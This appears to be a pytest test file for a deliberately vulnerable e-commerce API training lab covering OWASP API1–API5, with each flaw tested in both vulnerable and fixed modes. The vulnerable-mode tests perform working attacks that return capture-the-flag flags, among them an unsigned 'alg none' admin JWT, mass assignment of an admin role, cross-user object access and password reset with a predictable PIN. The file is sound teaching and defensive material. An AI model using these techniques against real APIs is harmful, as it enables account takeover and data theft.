"""Regression tests for OWASP API Security API1 through API5.

Validates both vulnerable-mode demonstrations and fixed-mode protections.
"""

import jwt
import pytest
from app.config import settings


@pytest.fixture
def alice_token(client):
    res = client.post("/api/v1/auth/login", json={"username": "alice", "password": "Password123!"})
    return res.json()["access_token"]


@pytest.fixture
def bob_token(client):
    res = client.post("/api/v1/auth/login", json={"username": "bob", "password": "Password123!"})
    return res.json()["access_token"]


@pytest.fixture
def seller_token(client):
    res = client.post("/api/v1/auth/login", json={"username": "seller_sam", "password": "SellerPass123!"})
    return res.json()["access_token"]


@pytest.fixture
def admin_token(client):
    res = client.post("/api/v1/auth/login", json={"username": "admin", "password": "AdminSecret2026!"})
    return res.json()["access_token"]


# ==============================================================================
# API1: Broken Object Level Authorization (BOLA)
# ==============================================================================
def test_api1_bola_order_vulnerable_mode(client, bob_token, monkeypatch):
    """VULN: Bob accesses Alice's order #1 and receives private tracking and flag."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.get("/api/v1/orders/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res.status_code == 200
    data = res.json()
    assert data["id"] == 1
    assert data["user_id"] == 1  # Alice's order ID
    assert "TRACK-ALICE" in data["tracking_number"]
    assert data["flag"] is not None
    assert "FLAG{API1_BOLA" in data["flag"]


def test_api1_bola_order_fixed_mode(client, bob_token, alice_token, monkeypatch):
    """FIX: Bob is denied access to Alice's order #1 with 403 Forbidden."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res_forbidden = client.get("/api/v1/orders/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res_forbidden.status_code == 403

    # Alice accessing her own order remains permitted
    res_owner = client.get("/api/v1/orders/1", headers={"Authorization": f"Bearer {alice_token}"})
    assert res_owner.status_code == 200
    assert res_owner.json()["user_id"] == 1


def test_api1_bola_returns_vulnerable_mode(client, bob_token, monkeypatch):
    """VULN: Bob accesses Alice's return request #1 and receives refund details & flag."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.get("/api/v1/returns/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res.status_code == 200
    data = res.json()
    assert data["id"] == 1
    assert data["user_id"] == 1
    assert data["flag"] is not None


def test_api1_bola_returns_fixed_mode(client, bob_token, alice_token, monkeypatch):
    """FIX: Bob receives 403 Forbidden when requesting Alice's return request."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res = client.get("/api/v1/returns/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res.status_code == 403

    # Alice accessing own return succeeds
    res_alice = client.get("/api/v1/returns/1", headers={"Authorization": f"Bearer {alice_token}"})
    assert res_alice.status_code == 200


# ==============================================================================
# API2: Broken Authentication
# ==============================================================================
def test_api2_forged_token_vulnerable_mode(client, monkeypatch):
    """VULN: Unsigned forged token with admin identity is accepted."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    unsigned_token = jwt.encode({"sub": "5", "username": "admin", "role": "admin"}, "", algorithm="none")

    res = client.post("/api/v1/auth/session-exchange", json={"token": unsigned_token})
    assert res.status_code == 200
    data = res.json()
    assert data["role"] == "admin"
    assert data["flag"] is not None
    assert "FLAG{API2_BROKEN_AUTH" in data["flag"]


def test_api2_forged_token_fixed_mode(client, monkeypatch):
    """FIX: Unsigned forged token is rejected with 401 Unauthorized."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    unsigned_token = jwt.encode({"sub": "5", "username": "admin", "role": "admin"}, "", algorithm="none")

    res = client.post("/api/v1/auth/session-exchange", json={"token": unsigned_token})
    assert res.status_code == 401


def test_api2_predictable_reset_vulnerable_mode(client, monkeypatch):
    """VULN: Predictable reset PIN resets user password without verification."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    # Initiate reset for charlie (user id 3)
    res_forgot = client.post("/api/v1/auth/forgot-password", json={"username_or_email": "charlie"})
    assert res_forgot.status_code == 200
    pin = res_forgot.json()["debug_pin"]

    # Reset password using the predictable PIN
    res_reset = client.post(
        "/api/v1/auth/reset-password",
        json={
            "username_or_email": "charlie",
            "reset_token": pin,
            "new_password": "NewCharliePassword123!",
        },
    )
    assert res_reset.status_code == 200
    assert "FLAG{API2_BROKEN_AUTH" in res_reset.json()["flag"]


def test_api2_predictable_reset_fixed_mode(client, monkeypatch):
    """FIX: Fixed mode rejects arbitrary 4-digit PINs and generates secure tokens."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res_forgot = client.post("/api/v1/auth/forgot-password", json={"username_or_email": "bob"})
    assert res_forgot.status_code == 200
    assert "debug_pin" not in res_forgot.json()

    # Attempting to reset with guessed 4-digit PIN fails
    res_reset = client.post(
        "/api/v1/auth/reset-password",
        json={
            "username_or_email": "bob",
            "reset_token": "2222",
            "new_password": "GuessedPassword123!",
        },
    )
    assert res_reset.status_code == 400


# ==============================================================================
# API3: Broken Object Property Level Authorization (BOPLA)
# ==============================================================================
def test_api3_mass_assignment_vulnerable_mode(client, bob_token, monkeypatch):
    """VULN: Mass assignment escalates Bob's role to admin and inflates balance."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.put(
        "/api/v1/users/profile",
        headers={"Authorization": f"Bearer {bob_token}"},
        json={"role": "admin", "balance": 99999.0},
    )
    assert res.status_code == 200
    data = res.json()
    assert data["role"] == "admin"
    assert data["balance"] == 99999.0
    assert data["flag"] is not None
    assert "FLAG{API3_BOPLA" in data["flag"]


def test_api3_mass_assignment_fixed_mode(client, alice_token, monkeypatch):
    """FIX: Strict schema rejects role mass assignment with 422 Unprocessable Entity."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res = client.put(
        "/api/v1/users/profile",
        headers={"Authorization": f"Bearer {alice_token}"},
        json={"role": "admin"},
    )
    assert res.status_code == 422


def test_api3_property_exposure_vulnerable_mode(client, bob_token, monkeypatch):
    """VULN: GET /api/v1/users/1 exposes Alice's bcrypt hash and balance."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.get("/api/v1/users/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res.status_code == 200
    data = res.json()
    assert "hashed_password" in data
    assert data["hashed_password"].startswith("$2b$")
    assert data["flag"] is not None


def test_api3_property_exposure_fixed_mode(client, bob_token, monkeypatch):
    """FIX: GET /api/v1/users/1 returns sanitized public profile without sensitive fields."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res = client.get("/api/v1/users/1", headers={"Authorization": f"Bearer {bob_token}"})
    assert res.status_code == 200
    data = res.json()
    assert "hashed_password" not in data
    assert "balance" not in data
    assert data["username"] == "alice"


# ==============================================================================
# API4: Unrestricted Resource Consumption
# ==============================================================================
def test_api4_unbounded_pagination_vulnerable_mode(client, monkeypatch):
    """VULN: Large limit parameter is accepted without bound and yields flag."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.get("/api/v1/products?limit=500")
    assert res.status_code == 200
    data = res.json()
    assert data["limit"] == 500
    assert data["flag"] is not None
    assert "FLAG{API4_RESOURCE_CONSUMPTION" in data["flag"]


def test_api4_unbounded_pagination_fixed_mode(client, monkeypatch):
    """FIX: Limit parameter is strictly capped at max 20 items."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res = client.get("/api/v1/products?limit=500")
    assert res.status_code == 200
    data = res.json()
    assert data["limit"] == 20
    assert len(data["items"]) <= 20
    assert data["flag"] is None


def test_api4_batch_cart_vulnerable_mode(client, bob_token, monkeypatch):
    """VULN: Huge quantity or large batch size is accepted without limits."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.post(
        "/api/v1/cart/batch-add",
        headers={"Authorization": f"Bearer {bob_token}"},
        json={"items": [{"product_id": 1, "quantity": 99999}]},
    )
    assert res.status_code == 200
    assert res.json()["flag"] is not None


def test_api4_batch_cart_fixed_mode(client, bob_token, monkeypatch):
    """FIX: Excessive quantity in cart batch request is rejected with 400 Bad Request."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    res = client.post(
        "/api/v1/cart/batch-add",
        headers={"Authorization": f"Bearer {bob_token}"},
        json={"items": [{"product_id": 1, "quantity": 99999}]},
    )
    assert res.status_code == 400


# ==============================================================================
# API5: Broken Function Level Authorization (BFLA)
# ==============================================================================
def test_api5_admin_export_vulnerable_mode(client, alice_token, monkeypatch):
    """VULN: Customer Alice accesses administrative user database export."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.get("/api/v1/admin/export-users", headers={"Authorization": f"Bearer {alice_token}"})
    assert res.status_code == 200
    data = res.json()
    assert data["total_users"] >= 5
    assert data["flag"] is not None
    assert "FLAG{API5_BFLA" in data["flag"]


def test_api5_admin_export_fixed_mode(client, alice_token, admin_token, monkeypatch):
    """FIX: Customer Alice receives 403 Forbidden on admin export; Admin succeeds."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    # Alice -> Forbidden (403)
    res_forbidden = client.get("/api/v1/admin/export-users", headers={"Authorization": f"Bearer {alice_token}"})
    assert res_forbidden.status_code == 403

    # Admin -> Allowed (200)
    res_allowed = client.get("/api/v1/admin/export-users", headers={"Authorization": f"Bearer {admin_token}"})
    assert res_allowed.status_code == 200
    assert res_allowed.json()["total_users"] >= 5


def test_api5_price_tampering_vulnerable_mode(client, alice_token, monkeypatch):
    """VULN: Customer Alice modifies product pricing."""
    monkeypatch.setattr(settings, "LAB_MODE", "vulnerable")
    res = client.put(
        "/api/v1/products/1/price",
        headers={"Authorization": f"Bearer {alice_token}"},
        json={"price": 0.99},
    )
    assert res.status_code == 200
    data = res.json()
    assert data["new_price"] == 0.99
    assert data["flag"] is not None


def test_api5_price_tampering_fixed_mode(client, alice_token, seller_token, monkeypatch):
    """FIX: Customer Alice receives 403 Forbidden; Seller Sam succeeds on own product."""
    monkeypatch.setattr(settings, "LAB_MODE", "fixed")
    # Alice -> Forbidden (403)
    res_forbidden = client.put(
        "/api/v1/products/1/price",
        headers={"Authorization": f"Bearer {alice_token}"},
        json={"price": 19.99},
    )
    assert res_forbidden.status_code == 403

    # Seller Sam -> Allowed (200)
    res_allowed = client.put(
        "/api/v1/products/1/price",
        headers={"Authorization": f"Bearer {seller_token}"},
        json={"price": 45.00},
    )
    assert res_allowed.status_code == 200
    assert res_allowed.json()["new_price"] == 45.00
